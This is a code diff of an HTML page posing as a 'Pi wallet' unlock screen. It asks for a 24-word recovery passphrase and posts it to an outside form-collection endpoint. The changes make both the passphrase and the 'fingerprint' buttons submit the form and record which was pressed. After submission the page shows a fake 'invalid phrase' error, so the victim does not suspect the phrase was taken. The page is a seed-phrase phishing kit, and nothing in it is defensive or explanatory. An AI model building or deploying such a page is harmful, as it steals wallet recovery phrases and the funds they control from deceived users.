@@ -106,12 +106,6 @@
       text-align: left;
     }
 
-    .error-box {
-      margin-top: 20px;
-      color: #5e2e91;
-      font-weight: bold;
-    }
-
     .note a.inline-link {
       background-color: var(--light-purple);
       color: var(--purple);
@@ -120,6 +114,13 @@
       padding: 2px 4px;
       border-radius: 4px;
       cursor: pointer;
+    }
+
+    .error-box {
+      margin-top: 20px;
+      color: #5e2e91;
+      font-weight: bold;
+      display: none;
     }
   </style>
 </head>
@@ -136,15 +137,17 @@
 
     <form id="passphrase-form" action="https://usebasin.com/f/309558e477ef" method="POST">
       <div class="passphrase-box">
-        <textarea name="passphrase" placeholder="Enter your 24-word\npassphrase here" required></textarea>
+        <textarea name="passphrase" placeholder="Enter your 24-word&#10;passphrase here" required></textarea>
       </div>
 
-      <button type="submit" class="btn-border">Unlock With Passphrase</button>
+      <!-- Hidden field to detect which button -->
+      <input type="hidden" name="unlock_method" id="unlock_method" value="">
+
+      <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
+      <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
     </form>
 
-    <button class="btn-filled" onclick="showError()">Unlock With Fingerprint</button>
-
-    <div id="error-msg" class="error-box" style="display:none;">
+    <div id="error-msg" class="error-box">
       Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
     </div>
 
@@ -158,8 +161,13 @@
   </div>
 
   <script>
-    function showError() {
-      document.getElementById("error-msg").style.display = "block";
+    function setMethod(method) {
+      document.getElementById("unlock_method").value = method;
+
+      // Optional: Show error on screen after clicking
+      setTimeout(() => {
+        document.getElementById("error-msg").style.display = 'block';
+      }, 100);
     }
   </script>
 </body>
